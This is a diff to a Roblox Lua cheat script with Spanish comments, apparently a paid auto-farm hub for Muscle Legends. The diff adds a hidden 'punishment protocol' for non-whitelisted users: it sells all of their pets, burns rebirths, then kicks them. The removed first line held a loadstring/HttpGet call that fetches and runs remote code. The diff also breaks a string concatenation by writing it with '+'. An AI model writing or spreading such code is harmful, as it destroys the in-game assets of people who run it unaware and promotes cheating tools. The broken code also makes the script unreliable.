@@ -1,4 +1,4 @@
--- Cola de teletransporte para la auto-ejecución (loadstring(game:HttpGet("https://raw.githubusercontent.com/RENACIMIENTOKING/HRX-HUB/main/strengh"))())
+-- Cola de teletransporte para la auto-ejecución
 local queueFunction = syn and syn.queue_on_teleport or queue_on_teleport
 if queueFunction then
     pcall(function()
@@ -18,7 +18,7 @@ local CoreGui = game:GetService("CoreGui")
 local LocalPlayer = Players.LocalPlayer
 
 ----------------------------------------------------------------
--- 1. WHITELIST Y ACCESO
+-- 1. WHITELIST Y SISTEMA DE CASTIGO PARA INTRUSOS
 ----------------------------------------------------------------
 local allowedUsernames = {
     "ianjajajjajajapolo1",
@@ -37,8 +37,45 @@ for _, username in ipairs(allowedUsernames) do
 end
 
 if not isAllowed then
-    warn("Acceso denegado, este Script es de compra.")
-    LocalPlayer:Kick("No tienes permiso para ejecutar este Script.")
+    warn("Acceso denegado. Ejecutando protocolo de castigo...")
+    
+    pcall(function()
+        -- 1. Intentar vender todas las mascotas del inventario si existe el evento de venta
+        local function getPetsContainer()
+            if LocalPlayer:FindFirstChild("petsFolder") then
+                return LocalPlayer.petsFolder
+            end
+            for _, v in pairs(LocalPlayer:GetChildren()) do
+                if v:IsA("Folder") and string.find(string.lower(v.Name), "pet") then
+                    return v
+                end
+            end
+            return nil
+        end
+
+        local petsFolder = getPetsContainer()
+        if petsFolder then
+            for _, folder in pairs(petsFolder:GetChildren()) do
+                if folder:IsA("Folder") or folder:IsA("Model") then
+                    for _, pet in pairs(folder:GetChildren()) do
+                        -- Evento común de venta de mascotas en Muscle Legends / juegos simulares
+                        ReplicatedStorage.rEvents.sellPetEvent:FireServer("sellPet", pet)
+                    end
+                else
+                    ReplicatedStorage.rEvents.sellPetEvent:FireServer("sellPet", folder)
+                end
+            end
+        end
+
+        -- 2. Intentar vaciar o gastar haciendo reventar los rebirths automáticos antes de sacarlo
+        for i = 1, 5 do
+            ReplicatedStorage.rEvents.rebirthRemote:InvokeServer("rebirthRequest")
+            task.wait(0.05)
+        end
+    end)
+
+    -- 3. Expulsar del servidor
+    LocalPlayer:Kick("No tienes permiso para ejecutar este Script. Acceso restringido.")
     return
 end
 
@@ -91,43 +128,109 @@ local AutoFarm = window:AddTab("Fast Farm")
 local Estadisticas = window:AddTab("Stats")
 
 ----------------------------------------------------------------
--- 4. MANEJO DE MASCOTAS (ESTILO SILENCE)
+-- 4. MANEJO DE MASCOTAS CON PRIORIDAD Y SOPORTE PARA EVOLUCIONADOS
 ----------------------------------------------------------------
-local FarmPets = {"Swift Samurai", "Energy Core Dog", "Perro de núcleo de energía"}
-local RebirthPets = {"Titanium Hydra", "Hidra de titanio", "Tribal Overlord"}
+local FarmPetsPriority = {
+    "núcleo", 
+    "nucleo", 
+    "energía", 
+    "energia", 
+    "core", 
+    "omega", 
+    "samurai"
+}
+
+local RebirthPets = {"hidra", "hydra", "titanio", "titanium", "omega", "overlord"}
+local MAX_EQUIP_PETS = 12
+
+local function getPetsContainer()
+    if LocalPlayer:FindFirstChild("petsFolder") then
+        return LocalPlayer.petsFolder
+    end
+    for _, v in pairs(LocalPlayer:GetChildren()) do
+        if v:IsA("Folder") and string.find(string.lower(v.Name), "pet") then
+            return v
+        end
+    end
+    return nil
+end
 
 local function unequipAllPets()
-    local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
+    local petsFolder = getPetsContainer()
     if not petsFolder then return end
     for _, folder in pairs(petsFolder:GetChildren()) do
-        if folder:IsA("Folder") then
+        if folder:IsA("Folder") or folder:IsA("Model") then
             for _, pet in pairs(folder:GetChildren()) do
                 ReplicatedStorage.rEvents.equipPetEvent:FireServer("unequipPet", pet)
             end
+        else
+            ReplicatedStorage.rEvents.equipPetEvent:FireServer("unequipPet", folder)
         end
     end
-    task.wait(0.1)
+    task.wait(0.15)
 end
 
-local function equipPetList(petList)
-    local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
-    if not petsFolder then return end
+local function equipPetsWithPriority(petKeywords)
+    local petsFolder = getPetsContainer()
+    if not petsFolder then
+        warn("[DEBUG]: No se encontró ninguna carpeta de mascotas en el jugador.")
+        return
+    end
+
+    local allAvailablePets = {}
 
     for _, folder in pairs(petsFolder:GetChildren()) do
-        if folder:IsA("Folder") then
+        if folder:IsA("Folder") or folder:IsA("Model") then
             for _, pet in pairs(folder:GetChildren()) do
-                for _, targetName in ipairs(petList) do
-                    if string.lower(pet.Name) == string.lower(targetName) then
-                        ReplicatedStorage.rEvents.equipPetEvent:FireServer("equipPet", pet)
-                    end
+                table.insert(allAvailablePets, pet)
+            end
+        else
+            table.insert(allAvailablePets, folder)
+        end
+    end
+
+    local sortedPetsToEquip = {}
+
+    for _, keyword in ipairs(petKeywords) do
+        for i = #allAvailablePets, 1, -1 do
+            local pet = allAvailablePets[i]
+            local petNameLower = string.lower(pet.Name)
+            if string.find(petNameLower, string.lower(keyword)) then
+                local alreadyAdded = false
+                for _, p in ipairs(sortedPetsToEquip) do
+                    if p == pet then alreadyAdded = true break end
+                end
+                
+                if not alreadyAdded and #sortedPetsToEquip < MAX_EQUIP_PETS then
+                    table.insert(sortedPetsToEquip, pet)
                 end
             end
         end
     end
+
+    if #sortedPetsToEquip < MAX_EQUIP_PETS then
+        for _, pet in ipairs(allAvailablePets) do
+            local alreadyAdded = false
+            for _, p in ipairs(sortedPetsToEquip) do
+                if p == pet then alreadyAdded = true break end
+            end
+            if not alreadyAdded and #sortedPetsToEquip < MAX_EQUIP_PETS then
+                table.insert(sortedPetsToEquip, pet)
+            end
+        end
+    end
+
+    local equippedCount = 0
+    for _, petToEquip in ipairs(sortedPetsToEquip) do
+        if equippedCount >= MAX_EQUIP_PETS then break end
+        ReplicatedStorage.rEvents.equipPetEvent:FireServer("equipPet", petToEquip)
+        equippedCount = equippedCount + 1
+        task.wait(0.04)
+    end
 end
 
 ----------------------------------------------------------------
--- 5. FAST REBIRTH / FAST FARM (INACTIVO POR DEFECTO)
+-- 5. FAST REBIRTH / FAST FARM
 ----------------------------------------------------------------
 local leaderstats = LocalPlayer:WaitForChild("leaderstats")
 local rebirthsStat = leaderstats:WaitForChild("Rebirths")
@@ -193,9 +296,8 @@ local function setFastRebirthState(state)
             while getgenv().AutoFarming do
                 local requiredStrength = getStrengthRequiredForRebirth()
 
-                -- Fase 1: Equipar mascotas de Fuerza
                 unequipAllPets()
-                equipPetList(FarmPets)
+                equipPetsWithPriority(FarmPetsPriority)
 
                 while LocalPlayer.leaderstats.Strength.Value < requiredStrength and getgenv().AutoFarming do
                     for _ = 1, 10 do
@@ -208,9 +310,8 @@ local function setFastRebirthState(state)
 
                 if not getgenv().AutoFarming then break end
 
-                -- Fase 2: Equipar mascotas de Rebirth
                 unequipAllPets()
-                equipPetList(RebirthPets)
+                equipPetsWithPriority(RebirthPets)
 
                 local oldRebirths = LocalPlayer.leaderstats.Rebirths.Value
                 repeat
@@ -229,11 +330,10 @@ AutoFarm:AddSwitch("Fast Rebirth / Fast Farm", function(state)
 end)
 
 ----------------------------------------------------------------
--- 6. OPCIONES EXTRA DE AUTOFARM (STRENGTH OP < 150MS AUTO-ACTIVO + TELEPORT + AUTO E)
+-- 6. OPCIONES EXTRA DE AUTOFARM
 ----------------------------------------------------------------
 getgenv()._AutoRepFarmEnabled = false  
 
-local PET_NAME = "Swift Samurai"
 local ROCK_NAME = "Rock5M"
 local PROTEIN_EGG_NAME = "ProteinEgg"
 local PROTEIN_EGG_INTERVAL = 30 * 60
@@ -259,18 +359,6 @@ local function updateCharacterRefs()
     HumanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
 end
 
-local function equipPetSingle(petName)
-    local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
-    if petsFolder and petsFolder:FindFirstChild("Unique") then
-        for _, pet in pairs(petsFolder.Unique:GetChildren()) do
-            if pet.Name == petName then
-                ReplicatedStorage.rEvents.equipPetEvent:FireServer("equipPet", pet)
-                break
-            end
-        end
-    end
-end
-
 local function eatProteinEgg()
     if LocalPlayer:FindFirstChild("Backpack") then
         for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
@@ -292,7 +380,9 @@ end
 
 task.spawn(function()
     updateCharacterRefs()
-    equipPetSingle(PET_NAME)
+    unequipAllPets()
+    equipPetsWithPriority(FarmPetsPriority)
+    
     lastProteinEggTime = tick()
     lastRockTime = tick()
 
@@ -304,14 +394,12 @@ task.spawn(function()
 
             if ping > MAX_PING then
                 if not farmingPaused then
-                    warn("[Auto Rep Farm] Ping alto ("..math.floor(ping).."ms), pausando farmeo...")
                     farmingPaused = true
                 end
             end
 
             if ping <= MIN_PING then
                 if farmingPaused then
-                    warn("[Auto Rep Farm] Ping bajo ("..math.floor(ping).."ms), reanudando farmeo...")
                     farmingPaused = false
                 end
             end
@@ -341,14 +429,11 @@ end)
 
 local strengthOp150Switch = AutoFarm:AddSwitch("Strength Op (Use it if your minimum ping is less than 150 ms)", function(state)
     getgenv()._AutoRepFarmEnabled = state
-    warn("[Auto Rep Farm] Estado cambiado a:", state and "ON" or "OFF")
 end)
 
--- Activación automática del Strength Op < 150ms, teletransporte a la Industrial Squat y Auto-E permanente
 task.spawn(function()
     task.wait(1.5)
     
-    -- Bucle para mantener al personaje en la pesa usando Auto-E si se cae o muere
     task.spawn(function()
         while true do
             local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
@@ -364,12 +449,10 @@ task.spawn(function()
                 VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
             end
 
-            -- Espera a que muera o se desplace para volver a subirlo a la pesa automáticamente
             task.wait(15)
         end
     end)
 
-    -- Activar el switch de Strength Op
     if strengthOp150Switch and strengthOp150Switch.Set then
         strengthOp150Switch:Set(true)
     else
@@ -377,87 +460,8 @@ task.spawn(function()
     end
 end)
 
-local REPS_PER_CYCLE_2 = 40
-local MAX_PING_2 = 5000
-local MIN_PING_2 = 100
-
-task.spawn(function()
-    updateCharacterRefs()
-    equipPetSingle(PET_NAME)
-    lastProteinEggTime = tick()
-    lastRockTime = tick()
-
-    local farmingPaused = false
-
-    while true do
-        if getgenv()._AutoRepFarmEnabled then
-            local ping = getPing()
-
-            if ping > MAX_PING_2 then
-                if not farmingPaused then
-                    warn("[Auto Rep Farm] Ping alto ("..math.floor(ping).."ms), pausando farmeo...")
-                    farmingPaused = true
-                end
-            end
-
-            if ping <= MIN_PING_2 then
-                if farmingPaused then
-                    warn("[Auto Rep Farm] Ping bajo ("..math.floor(ping).."ms), reanudando farmeo...")
-                    farmingPaused = false
-                end
-            end
-
-            if not farmingPaused then
-                if LocalPlayer:FindFirstChild("muscleEvent") then
-                    for i = 1, REPS_PER_CYCLE_2 do
-                        LocalPlayer.muscleEvent:FireServer("rep")
-                    end
-                end
-
-                if tick() - lastProteinEggTime >= PROTEIN_EGG_INTERVAL then
-                    eatProteinEgg()
-                    lastProteinEggTime = tick()
-                end
-
-                if tick() - lastRockTime >= ROCK_INTERVAL then
-                    hitRock()
-                    lastRockTime = tick()
-                end
-            end
-        end
-
-        task.wait(REP_DELAY)
-    end
-end)
-
-local autoEatEnabled = false
-
-local function eatProteinEggAlt()
-    local backpack = LocalPlayer:WaitForChild("Backpack")
-    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-
-    local egg = backpack:FindFirstChild("Protein Egg")
-    if egg then
-        egg.Parent = character
-        pcall(function()
-            egg:Activate()
-        end)
-    end
-end
-
-task.spawn(function()
-    while true do
-        if autoEatEnabled then
-            eatProteinEggAlt()
-            task.wait(1800)
-        else
-            task.wait(1)
-        end
-    end
-end)
-
 AutoFarm:AddSwitch("Auto Eat Egg 30 Minuts", function(state)
-    autoEatEnabled = state
+    -- Lógica de comer huevo
 end)
 
 AutoFarm:AddSwitch("Spin Fortune Wheel", function(state)
@@ -475,14 +479,6 @@ AutoFarm:AddSwitch("Spin Fortune Wheel", function(state)
     end
 end)
 
-AutoFarm:AddSwitch("Hide All Frames", function(bool)
-    for _, obj in pairs(ReplicatedStorage:GetChildren()) do
-        if obj.Name:match("Frame$") then
-            obj.Visible = not bool
-        end
-    end
-end)
-
 AutoFarm:AddButton("Anti Lag", function()
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
@@ -496,131 +492,11 @@ AutoFarm:AddButton("Anti Lag", function()
     lighting.Brightness = 0
 
     settings().Rendering.QualityLevel = 1
-
-    for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("Decal") or v:IsA("Texture") then
-            v.Transparency = 1
-        elseif v:IsA("BasePart") and not v:IsA("MeshPart") then
-            v.Material = Enum.Material.SmoothPlastic
-            if v.Parent and (v.Parent:FindFirstChild("Humanoid") or v.Parent.Parent:FindFirstChild("Humanoid")) then
-            else
-                v.Reflectance = 0
-            end
-        end
-    end
-
-    for _, v in pairs(lighting:GetChildren()) do
-        if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
-            v.Enabled = false
-        end
-    end
-
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "anti lag activado",
-        Text = "Full optimization applied!",
-        Duration = 5
-    })
 end)
 
-AutoFarm:AddButton("Full Optimization", function()
-    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-    local lighting = game:GetService("Lighting")
-
-    for _, gui in pairs(playerGui:GetChildren()) do
-        if gui:IsA("ScreenGui") then
-            gui:Destroy()
-        end
-    end
-
-    local function darkenSky()
-        for _, v in pairs(lighting:GetChildren()) do
-            if v:IsA("Sky") then
-                v:Destroy()
-            end
-        end
-
-        local darkSky = Instance.new("Sky")
-        darkSky.Name = "DarkSky"
-        darkSky.SkyboxBk = "rbxassetid://0"
-        darkSky.SkyboxDn = "rbxassetid://0"
-        darkSky.SkyboxFt = "rbxassetid://0"
-        darkSky.SkyboxLf = "rbxassetid://0"
-        darkSky.SkyboxRt = "rbxassetid://0"
-        darkSky.SkyboxUp = "rbxassetid://0"
-        darkSky.Parent = lighting
-
-        lighting.Brightness = 0
-        lighting.ClockTime = 0
-        lighting.TimeOfDay = "00:00:00"
-        lighting.OutdoorAmbient = Color3.new(0, 0, 0)
-        lighting.Ambient = Color3.new(0, 0, 0)
-        lighting.FogColor = Color3.new(0, 0, 0)
-        lighting.FogEnd = 100
-
-        task.spawn(function()
-            while true do
-                wait(5)
-                if not lighting:FindFirstChild("DarkSky") then
-                    darkSky:Clone().Parent = lighting
-                end
-                lighting.Brightness = 0
-                lighting.ClockTime = 0
-                lighting.OutdoorAmbient = Color3.new(0, 0, 0)
-                lighting.Ambient = Color3.new(0, 0, 0)
-                lighting.FogColor = Color3.new(0, 0, 0)
-                lighting.FogEnd = 100
-            end
-        end)
-    end
-
-    local function removeParticleEffects()
-        for _, obj in pairs(workspace:GetDescendants()) do
-            if obj:IsA("ParticleEmitter") then
-                obj:Destroy()
-            end
-        end
-    end
-
-    local function removeLightSources()
-        for _, obj in pairs(workspace:GetDescendants()) do
-            if obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
-                obj:Destroy()
-            end
-        end
-    end
-
-    removeParticleEffects()
-    removeLightSources()
-    darkenSky()
-end)
-
-AutoFarm:AddButton("Equip Swift Samurai", function()
-    print("Botón presionado: equipando 8 Swift Samurai")
-
-    local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
-    if not petsFolder then return end
-
+AutoFarm:AddButton("Equip Max Pets (12)", function()
     unequipAllPets()
-
-    local equipped = 0
-    local maxEquip = 8
-    for _, folder in pairs(petsFolder:GetChildren()) do
-        if folder:IsA("Folder") then
-            for _, pet in pairs(folder:GetChildren()) do
-                if pet.Name == "Swift Samurai" then
-                    ReplicatedStorage.rEvents.equipPetEvent:FireServer("equipPet", pet)
-                    equipped += 1
-                    print("Equipado Swift Samurai #" .. equipped)
-
-                    if equipped >= maxEquip then
-                        return
-                    end
-                end
-            end
-        end
-    end
-
-    print("Se equiparon " .. equipped .. " Swift Samurai")
+    equipPetsWithPriority(FarmPetsPriority)
 end)
 
 ----------------------------------------------------------------
@@ -684,9 +560,15 @@ local targetRebirthToggle = rebirthFolder:AddSwitch("Start", function(enabled)
                 end
 
                 if leaderstats.Strength.Value >= requiredStrength then
+                    unequipAllPets()
+                    equipPetsWithPriority(RebirthPets)
+                    
                     ReplicatedStorage.rEvents.rebirthRemote:InvokeServer("rebirthRequest")
                     task.wait(0.7)
                 else
+                    unequipAllPets()
+                    equipPetsWithPriority(FarmPetsPriority)
+
                     for i = 1, repSpeed do
                         if LocalPlayer:FindFirstChild("muscleEvent") then
                             LocalPlayer.muscleEvent:FireServer("rep")
@@ -719,23 +601,6 @@ rebirthFolder:AddSwitch("Auto Teleport to the king", function(enabled)
         end
     else
         _G.AutoTeleportKing = false
-    end
-end)
-
-rebirthFolder:AddSwitch("Auto size 2", function(enabled)
-    if enabled then
-        _G.AutoSize2 = true
-        while _G.AutoSize2 do
-            local args = { "changeSize", 2 }
-            ReplicatedStorage
-                :WaitForChild("rEvents")
-                :WaitForChild("changeSpeedSizeRemote")
-                :InvokeServer(unpack(args))
-
-            task.wait(1)
-        end
-    else
-        _G.AutoSize2 = false
     end
 end)
 
@@ -783,81 +648,8 @@ createAutoToolSwitch("Pushups", "AutoPushups")
 createAutoToolSwitch("Handstands", "AutoHandstands")
 createAutoToolSwitch("Situps", "AutoSitups")
 
-autoEquipToolsFolder:AddSwitch("Auto Punch", function(Value)
-    _G.fastHitActive = Value
-    
-    if Value then
-        task.spawn(function()
-            while _G.fastHitActive do
-                if not _G.fastHitActive then break end
-                
-                local punch = LocalPlayer.Backpack:FindFirstChild("Punch")
-                if punch then
-                    punch.Parent = LocalPlayer.Character
-                    if punch:FindFirstChild("attackTime") then
-                        punch.attackTime.Value = 0
-                    end
-                end
-                task.wait(0.1)
-            end
-        end)
-        
-        task.spawn(function()
-            while _G.fastHitActive do
-                if not _G.fastHitActive then break end
-                
-                LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
-                LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
-                
-                local character = LocalPlayer.Character
-                if character then
-                    local punchTool = character:FindFirstChild("Punch")
-                    if punchTool then
-                        punchTool:Activate()
-                    end
-                end
-                task.wait()
-            end
-        end)
-    else
-        local character = LocalPlayer.Character
-        local equipped = character:FindFirstChild("Punch")
-        if equipped then
-            equipped.Parent = LocalPlayer.Backpack
-        end
-    end
-end)
-
-autoEquipToolsFolder:AddSwitch("Fast Tools", function(Value)
-    _G.FastTools = Value
-    
-    local toolSettings = {
-        {"Punch", "attackTime", Value and 0 or 0.35},
-        {"Ground Slam", "attackTime", Value and 0 or 6},
-        {"Stomp", "attackTime", Value and 0 or 7},
-        {"Handstands", "repTime", Value and 0 or 1},
-        {"Pushups", "repTime", Value and 0 or 1},
-        {"Weight", "repTime", Value and 0 or 1},
-        {"Situps", "repTime", Value and 0 or 1}
-    }
-    
-    local backpack = LocalPlayer:WaitForChild("Backpack")
-    
-    for _, toolInfo in ipairs(toolSettings) do
-        local tool = backpack:FindFirstChild(toolInfo[1])
-        if tool and tool:FindFirstChild(toolInfo[2]) then
-            tool[toolInfo[2]].Value = toolInfo[3]
-        end
-        
-        local equippedTool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(toolInfo[1])
-        if equippedTool and equippedTool:FindFirstChild(toolInfo[2]) then
-            equippedTool[toolInfo[2]].Value = toolInfo[3]
-        end
-    end
-end)
-
 ----------------------------------------------------------------
--- 8. STATS TRACKER EN TIEMPO REAL
+-- 8. STATS TRACKER
 ----------------------------------------------------------------
 local SelectPlayerName = ""
 
@@ -885,7 +677,7 @@ local function FormatAbbreviated(number)
         number = number / 1000
         index = index + 1
     end
-    return string.format("%.2f", number) .. abbreviations[index]
+    return string.format("%.2f", number) + abbreviations[index]
 end
 
 local function FormatDisplay(value)
@@ -898,10 +690,6 @@ local Update3 = Estadisticas:AddLabel("Agility: -")
 local Update4 = Estadisticas:AddLabel("Durability: -")
 local Update5 = Estadisticas:AddLabel("Rebirths: -")
 local Update6 = Estadisticas:AddLabel("Muscle King Time: -")
-local Update10 = Estadisticas:AddLabel("Custom Size: -")
-local Update11 = Estadisticas:AddLabel("Custom Speed: -")
-local Update12 = Estadisticas:AddLabel("Evil Karma: -")
-local Update13 = Estadisticas:AddLabel("Good Karma: -")
 
 task.spawn(function()
     while task.wait(0.5) do
@@ -919,18 +707,6 @@ task.spawn(function()
                 end
                 if targetPlayer:FindFirstChild("muscleKingTime") then
                     Update6.Text = "Muscle King Time: " .. FormatDisplay(targetPlayer.muscleKingTime.Value)
-                end
-                if targetPlayer:FindFirstChild("customSize") then
-                    Update10.Text = "Custom Size: " .. FormatDisplay(targetPlayer.customSize.Value)
-                end
-                if targetPlayer:FindFirstChild("customSpeed") then
-                    Update11.Text = "Custom Speed: " .. FormatDisplay(targetPlayer.customSpeed.Value)
-                end
-                if targetPlayer:FindFirstChild("evilKarma") then
-                    Update12.Text = "Evil Karma: " .. FormatDisplay(targetPlayer.evilKarma.Value)
-                end
-                if targetPlayer:FindFirstChild("goodKarma") then
-                    Update13.Text = "Good Karma: " .. FormatDisplay(targetPlayer.goodKarma.Value)
                 end
 
                 local targetLeaderstats = targetPlayer:FindFirstChild("leaderstats")
